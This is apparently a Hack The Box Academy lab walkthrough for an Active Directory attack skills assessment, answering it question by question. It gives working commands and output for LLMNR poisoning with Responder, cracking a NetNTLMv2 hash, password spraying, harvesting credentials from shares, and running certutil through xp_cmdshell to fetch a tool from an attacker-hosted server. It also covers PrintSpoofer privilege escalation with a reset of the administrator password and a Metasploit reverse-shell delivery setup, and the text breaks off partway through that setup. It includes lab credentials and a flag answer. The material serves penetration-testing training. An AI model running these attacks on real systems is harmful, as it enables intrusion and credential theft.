# 

---

## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.


## 1. Over Evil WinRM Build a correct `users.txt` from `ad_users.txt`

Run this **exact** command:

`grep -E '^[A-Za-z0-9_]+[[:space:]]' ad_users.txt \   | awk '{print $1}' \   | grep -v -E '^(Name|Impacket|\[\*]|\-+)$' \   > users.txt`


## 2. SSH with X11 forwarding enabled
If you REALLY want to run `xfreerdp`, you must SSH in like this:

`ssh -X htb-student@10.129.130.219`


---
## Question 1

### "Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?"

Students need to first SSH into the ParrotOS jump-box using the `htb-student:HTB_@cademy_stdnt!` credentials:



```shell
ssh htb-student@STMIP
```



```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ ssh htb-student@10.129.251.238

The authenticity of host '10.129.251.238 (10.129.251.238)' can't be established.
ECDSA key fingerprint is SHA256:BG+VzltzkKbaMbC5FR8GU9x0pcbUBhct6AGrnjH/CHg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.251.238' (ECDSA) to the list of known hosts.
htb-student@10.129.251.238's password: 
Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|


The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
┌─[htb-student@skills-par01]─[~]
└──╼ $
```

Subsequently, students need to run `Responder` to try and attempt to steal hashes:


```shell
sudo responder -I ens224 -wrfv
```


```shell-session
┌─[htb-student@skills-par01]─[~]
└──╼ $ sudo responder -I ens224 -wrfv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

<SNIP>

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
```

Students will receive the NTLM relay from user `AB920`.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 2

### "What is this user's cleartext password?"

Students need to crack the hash from the previous question with `Hashcat`, utilizing hashmode `5600` and using the `rockyou.txt.gz` wordlist:


```shell
hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz 
```


```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

AB920::INLANEFREIGHT:6741b51d529201c7:f8653c1e3120b191a7da708c0e363f8b:0101000000000000805c79559355d801cc5f7452b6ab182600000000020008005900560041004c0001001e00570049004e002d003000440031004c005700350056004c0037004100320004003400570049004e002d003000440031004c005700350056004c003700410032002e005900560041004c002e004c004f00430041004c00030014005900560041004c002e004c004f00430041004c00050014005900560041004c002e004c004f00430041004c0007000800805c79559355d801060004000200000008003000300000000000000000000000002000008fd5b9337124cec895a3c0d2fd95f12fa421aa37fcf02a652fe227b46bb832db0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
  
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:6741b51d529201c7:f8653c1e3120b...000000
Time.Started.....: Thu Apr 21 15:37:27 2022 (1 sec)
Time.Estimated...: Thu Apr 21 15:37:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   312.8 kH/s (3.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered.Total..: 1/1 (100.00%) Digests
Progress.........: 290816/14344386 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344386 (2.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: winewine -> tenelle
Hardware.Mon.#1..: Util: 36%

Started: Thu Apr 21 15:36:32 2022
Stopped: Thu Apr 21 15:37:28 2022
```

The password is revealed to be `weasal`.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 3

### "Submit the contents of the C:\flag.txt file on MS01."

Students need to run `Nmap` to discover more hosts in the `172.16.7.0/24` subnet:


```shell-session
sudo nmap -p 88,445,3389 --open 172.16.7.0/24
```


```shell-session
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼$ sudo nmap -p 88,445,3389 --open 172.16.7.0/24

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 15:39 EDT
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0037s latency).
Not shown: 1 closed tcp port (reset)
PORT    STATE SERVICE
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B9:85:F7 (VMware)

Nmap scan report for 172.16.7.50
Host is up (0.0027s latency).
Not shown: 1 closed tcp port (reset)
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:F7:14 (VMware)

Nmap scan report for 172.16.7.60
Host is up (0.0032s latency).
Not shown: 2 closed tcp ports (reset)
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B9:52:1B (VMware)

Nmap scan report for 172.16.7.240
Host is up (0.0024s latency).
Not shown: 2 closed tcp ports (reset)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (4 hosts up) scanned in 28.03 seconds
```

Then, students will find three live hosts and note that `172.16.7.3` is the `INLANEFREIGHT.LOCAL` domain controller.


```shell-session
172.16.7.3
172.16.7.50
172.16.7.60
```

Students need to run `BloodHound` to survey/scan the domain:


```shell
bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```


```shell-session
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $ bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 504 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 2902 users
INFO: Connecting to GC LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 164 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>
```

Students may need to RDP into the ParrotOS jump-box to view the Bloodhound data. Unfortunately, Bloodhound does not reveal the next phase of the attack, thus, students need to enumerate further, running `Nmap` against `172.16.7.50`:


```shell
nmap -A 172.16.7.50
```


```shell-session
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $nmap -A 172.16.7.50

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 10:48 EST
Nmap scan report for 172.16.7.50
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-24T15:49:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-11-23T14:36:21
|_Not valid after:  2023-05-25T14:36:21
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-24T15:49:11+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e0:64 (VMware)
| smb2-time: 
|   date: 2022-11-24T15:49:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds
```

Subsequently, students need to connect to `MS01` using RDP, having the opportunity to use drive redirection:


```shell
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution
```


```shell-session
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution

[10:55:37:823] [3096:3097] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

Now, files that are on the desktop of the ParrotOS jump-box will be accessible as a file share on MS01:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_21.png)

Students will also be able to read the flag from the file "flag.txt", which is in the `C:\` directory:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_22.png)

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 4

### "Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain."

Students need to be able to use `PowerView` and `Kerbrute` from MS01. Using the redirected drive, files on the ParrotOS desktop will be accessible from MS01. Students will begin by first downloading these files to PwnBox:


```shell
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```


```shell-session
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

Then, the files can be transferred to the ParrotOS jump-box using `scp`:


```shell
scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop
scp kerbrute_windows_amd64.exe htb-student@STMIP:/home/htb-student/Desktop
```


```shell-session
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
PowerView.ps1                                 100%  752KB   1.2MB/s   00:00  

┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
kerbrute_windows_amd64.exe                    100% 7810KB   7.7MB/s   00:00
```

Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_23.png)

Students need to open PowerShell and navigate to `C:\Users\AB920\Desktop`, to then use `PowerView` to generate a list of domain users:


```powershell
cd .\Desktop\
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
Get-Content .\adusers.txt | select -First 10
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\AB920> cd .\Desktop\
PS C:\Users\AB920\Desktop> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
PS C:\Users\AB920\Desktop> Import-Module .\PowerView.ps1
PS C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt

PS C:\Users\AB920\Desktop> Get-Content .\adusers.txt | select -First 10

Administrator
Guest
krbtgt
NY340
RO050
FF479
EU303
SX681
AJ725
PH432
```

Subsequently, students need to use `kerbrute.exe` to password spray against the user list generated:


```powershell
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
```

  AD Enumeration & Attacks - Skills Assessment Part II

```powershell-session
PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop

2022/11/29 10:42:57 >  Using KDC(s):
2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1
2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
PS C:\Users\AB920\Desktop>
```

Students will find the user `BR086`.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 5

### "What is this user's password?"

Students can refer to the output from `Kerbrute` from the previous question to discover the password `Welcome1`:


```powershell
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
```


```powershell-session
PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop

2022/11/29 10:42:57 >  Using KDC(s):
2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1
2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 6

### "Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?"

Students need to run `Snaffler.exe` on MS01 to hunt for shares, however, first, it must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box:

```shell
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop
```


```shell-session
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe

┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
Snaffler.exe           
```

Then, from MS01, students need to use the shared drive to move `Snaffler.exe` to the Desktop.

Using the previously established PowerShell session, students need use `runas` to launch a new PowerShell session as the `BR086` user (providing the password `Welcome1` when prompted):


```powershell
runas /netonly /user:INLANEFREIGHT\BR086 powershell
```


```powershell-session
PS C:\Users\AB920\Desktop> runas /netonly /user:INLANEFREIGHT\BR086 powershell

Enter the password for INLANEFREIGHT\BR086:

Attempting to start powershell as user "INLANEFREIGHT\BR086" ...
```

From the newly created PowerShell session, students to run `Snaffler.exe` to find a SQL connection string in a web.config file:


```powershell
cd C:\users\AB920\Desktop
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```


```powershell-session
PS C:\Windows\System32>cd C:\users\AB920\Desktop
PS C:\users\AB920\Desktop>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:11Z [File] {Yellow}<KeepDbConnStringPw|R|connectionstring.{1,200}passw|1.2kB|2022-04-01 15:04:05Z>(\\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config) etEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS;database=master;Integrated\ Security=SSPI;Pooling=true"/>\ \n\ \ \ \ \ \ \ </masterDataServices>\ \ \n\ \ \ \ \ \ \ <connectionStrings>\n\ \ \ \ \ \ \ \ \ \ \ <add\ name="ConString"\ connectionString="Environment\.GetEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS';Initial\ Catalog=Northwind;User\ ID=netdb;Password=D@ta_bAse_adm1n!"/>\n\ \ \ \ \ \ \ </connectionStrings>\n\ \ </system\.web>\n</co
```

From the output of `Snaffler`, students will find the credentials `netdb:D@ta_bAse_adm1n!`.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 7

### "Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host."

From the ParrotOS jump-box, students need to use `mssqlclient.py` to connect to the `MSSQL` database at `172.16.7.60`:

```shell
mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60
```

```shell-session
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $ mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
--------------------------------------------------------------------------------
```

Subsequently, students need to enable `xp_cmdshell`:

```sql
enable_xp_cmdshell
```

```sql
SQL> enable_xp_cmdshell

[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Students then need to check the user's privileges to discover that `SeImpersonatePrivilege` is enabled:
```sql
xp_cmdshell whoami /priv
```

```sql
SQL> xp_cmdshell whoami /priv

output                                                                             

PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Students need to escalate privileges using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). Alternatively, students could also likely use `JuicyPotato`, `LonelyPotato`, `RoguePotato`, `EfsPotato`. First, students need to transfer the `PrintSpoofer64.exe` from Pwnbox to the Parrot OS jump-box (`skills-par01`):

```shell
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
```

```shell-session
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe’

PrintSpoofer64.exe             100%[=================================================>]  26.50K  --.-KB/s    in 0.07s   

2022-11-29 17:23:23 (357 KB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp PrintSpoofer64.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
PrintSpoofer64.exe                                                                     100%   27KB 167.0KB/s   00:00                
```

Then, students need to start a web server from the skills-par01 jump-box:

```shell
python3 -m http.server PWNPO
```


```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $python3 -m http.server 9000

Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Students now need to transfer it to the SQL01 target using `xp_cmdshell` and `certutil.exe`:

```sql
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```


```sql
SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe

output                                                                             

----------------------------------------------------------

****  Online  ****                                                                 

  0000  ...                                                                        

  6a00                                                                             

CertUtil: -URLCache command completed successfully. 
```

Students can now use `PrintSpoofer.exe` to run commands as SYSTEM. One option is to catch a reverse shell, or, add a new admin user. However, students will find the simplest way forward is simply to change the password for the current local administrator (setting it to `Welcome1` in here):


```sql
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```


```sql
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

NULL
```

At last, students can authenticate as the local administrator to retrieve the flag, using the credentials `administrator:Welcome1`:


```shell
smbclient -U "administrator" \\\\172.16.7.60\\C$
cd Users\Administrator\Desktop\
get flag.txt
exit
cat flag.txt
```


```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $smbclient -U "administrator" \\\\172.16.7.60\\C$
Enter WORKGROUP\administrator's password: 

Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> get flag.txt

getting file \Users\Administrator\Desktop\flag.txt of size 21 as flag.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)

smb: \Users\Administrator\Desktop\> exit

┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $cat flag.txt

s3imp3rs0nate_cl@ssic
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 8

### "Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host."

Students first need to prepare a `meterpreter` web_delivery payload from the ParrotOS jump-box:

```shell
sudo msfconsole -q
search web_delivery
use 1
set payload windows/x64/meterpreter/reverse_tcp
set TARGET 2
set SRVHOST 172.16.7.240
set LHOST 172.16.7.240
exploit
```

```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery

[msf](Jobs:0 Agents:0) >> use 1
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 172.16.7.240
SRVHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 172.16.7.240
LHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.7.240:4444 
[*] Using URL: http://172.16.7.240:8080/za1FaPR8o
[*] Server started.
[*] Run the following command on the target machine:
